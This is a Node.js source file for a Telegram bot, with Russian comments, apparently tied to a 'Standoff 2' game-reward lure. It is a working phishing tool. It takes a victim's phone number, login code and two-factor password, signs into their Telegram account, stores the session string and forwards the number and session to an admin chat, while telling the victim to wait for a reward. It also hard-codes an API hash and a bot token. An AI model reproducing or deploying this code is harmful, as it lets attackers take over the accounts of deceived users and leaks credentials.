const express = require('express');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { ConnectionWebSocket } = require('telegram/network'); // Принудительный WebSocket
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// ⚠️ ТВОИ ДАННЫЕ ⚠️
const apiId = 36752126; 
const apiHash = "fdd421fda2805b7dbf3f1f53b793d512";
const BOT_TOKEN = "9096721962:AAHdJ-AhnKSHyyAv3ExEHVZC5pdE_do59Co";
const ADMIN_ID = 9068204920; 

const bot = new TelegramBot(BOT_TOKEN, { polling: false });

const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL 
    ? `${process.env.RENDER_EXTERNAL_URL}/bot${BOT_TOKEN}`
    : `https://standoff2-fd3h.onrender.com/bot${BOT_TOKEN}`;

bot.setWebHook(WEBHOOK_URL)
    .then(() => console.log(`✅ Webhook установлен: ${WEBHOOK_URL}`))
    .catch(err => console.error("❌ Ошибка Webhook:", err));

app.post(`/bot${BOT_TOKEN}`, (req, res) => {
    try {
        bot.processUpdate(req.body);
        res.sendStatus(200);
    } catch (e) {
        console.error("Ошибка обработки Webhook:", e);
        res.sendStatus(500);
    }
});

// === БАЗА ДАННЫХ ===
const DB_FILE = './database.json';
if (!fs.existsSync(DB_FILE)) fs.writeFileSync(DB_FILE, JSON.stringify({ sessions: [], stats: { total: 0 } }));
const getDB = () => JSON.parse(fs.readFileSync(DB_FILE));
const saveDB = (data) => fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));

const userStates = new Map();
const activeClients = new Map();

// Официальные IP-адреса Telegram Data Centers
const DC_IPS = {
    1: '149.154.175.53',
    2: '149.154.167.51',
    3: '149.154.175.100',
    4: '149.154.167.91',
    5: '91.108.56.130'
};

// Создание клиента с WebSocket и без автопереподключения
function createClient(retries = 0) {
    return new TelegramClient(new StringSession(""), apiId, apiHash, { 
        connectionRetries: retries, 
        useWSS: true,
        connection: ConnectionWebSocket, // Принудительный WebSocket
        deviceModel: "Desktop",
        systemVersion: "Windows 10",
        appVersion: "1.0.0",
        langCode: "en"
    });
}

// Отправка кода с ручной миграцией
async function sendCodeWithMigration(phone) {
    // retries: 0 - чтобы GramJS не пытался сам переподключиться и не завис
    let client = createClient(0);
    await client.connect();
    console.log("✅ Подключен к DC 1");
    
    try {
        const result = await client.sendCode({ apiId, apiHash }, phone);
        console.log("✅ Код отправлен с DC 1");
        return { client, phoneCodeHash: result.phoneCodeHash };
    } catch (e) {
        // Ловим ошибку миграции
        if (e.errorMessage && e.errorMessage.startsWith('PHONE_MIGRATE_')) {
            const dcId = parseInt(e.errorMessage.split('_')[2]);
            const dcIp = DC_IPS[dcId] || '149.154.167.51';
            console.log(`🔄 Миграция на DC ${dcId} (IP: ${dcIp})...`);
            
            // Убиваем старый клиент
            await client.disconnect();
            
            // Создаем новый уже для нужного DC
            client = createClient(5);
            await client.session.setDC(dcId, dcIp, 443);
            await client.connect();
            console.log(`✅ Подключен к DC ${dcId}`);
            
            // Повторяем отправку
            const result = await client.sendCode({ apiId, apiHash }, phone);
            console.log("✅ Код отправлен после миграции");
            return { client, phoneCodeHash: result.phoneCodeHash };
        }
        throw e;
    }
}

app.get('/api/stats', (req, res) => {
    const db = getDB();
    res.json({ total: db.stats.total, sessions: db.sessions.map(s => ({ phone: s.phone, date: s.date })) });
});

// === ЛОГИКА БОТА ===
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    userStates.set(chatId, { step: 'phone' });
    bot.sendMessage(chatId, "👋 Привет! Введи свой номер телефона (можно без +, я добавлю сам):");
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    let text = msg.text;
    
    if (!text || text.startsWith('/')) return;

    const state = userStates.get(chatId);
    if (!state) return;

    // ШАГ 1: НОМЕР
    if (state.step === 'phone') {
        let phone = text.trim().replace(/[^\d]/g, '');
        if (!phone.startsWith('+')) phone = '+' + phone;

        bot.sendMessage(chatId, "⏳ Отправляю запрос в Telegram...");
        
        try {
            const { client, phoneCodeHash } = await sendCodeWithMigration(phone);
            activeClients.set(chatId, { client, phoneCodeHash, phone });
            userStates.set(chatId, { step: 'code' });
            bot.sendMessage(chatId, "📩 Код отправлен! Введи код из Telegram:");
        } catch (e) {
            console.error("❌ Ошибка отправки кода:", e);
            bot.sendMessage(chatId, "❌ Ошибка Telegram: " + (e.errorMessage || e.message));
            userStates.delete(chatId);
        }
    }

    // ШАГ 2: КОД
    if (state.step === 'code') {
        const code = text.trim();
        const sessionData = activeClients.get(chatId);
        if (!sessionData) return bot.sendMessage(chatId, "❌ Сессия истекла. Напиши /start заново.");

        try {
            const { client, phoneCodeHash, phone } = sessionData;
            await client.invoke(new Api.auth.SignIn({ phoneNumber: phone, phoneCodeHash, phoneCode: code }));
            
            const sessionString = client.session.save();
            saveSession(phone, sessionString);
            bot.sendMessage(chatId, "✅ Успешно! Аккаунт привязан. Ожидайте награду.");
            activeClients.delete(chatId);
            userStates.delete(chatId);
        } catch (e) {
            if (e.errorMessage === 'SESSION_PASSWORD_NEEDED') {
                userStates.set(chatId, { step: 'password' });
                bot.sendMessage(chatId, "🔐 Включен облачный пароль (2FA). Введи пароль:");
            } else {
                bot.sendMessage(chatId, "❌ Неверный код. Попробуй еще раз или напиши /start.");
            }
        }
    }

    // ШАГ 3: ПАРОЛЬ (2FA)
    if (state.step === 'password') {
        const password = text.trim();
        const sessionData = activeClients.get(chatId);
        if (!sessionData) return bot.sendMessage(chatId, "❌ Сессия истекла. Напиши /start заново.");

        try {
            const { client, phone } = sessionData;
            await client.signInWithPassword({ password }, async () => {});
            const sessionString = client.session.save();
            saveSession(phone, sessionString);
            bot.sendMessage(chatId, "✅ Успешно! Аккаунт привязан. Ожидайте награду.");
            activeClients.delete(chatId);
            userStates.delete(chatId);
        } catch (e) {
            bot.sendMessage(chatId, "❌ Неверный пароль. Попробуй еще раз.");
        }
    }
});

function saveSession(phone, sessionString) {
    const db = getDB();
    db.sessions.push({ phone, session: sessionString, date: new Date().toISOString() });
    db.stats.total += 1;
    saveDB(db);
    bot.sendMessage(ADMIN_ID, `🔥 **НОВЫЙ АККАУНТ!**\n\n📱 Номер: \`${phone}\`\n🔑 Сессия: \`${sessionString}\``, { parse_mode: 'Markdown' })
    .catch(err => console.error("Ошибка отправки админу:", err));
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Сервер запущен на порту ${PORT}`));
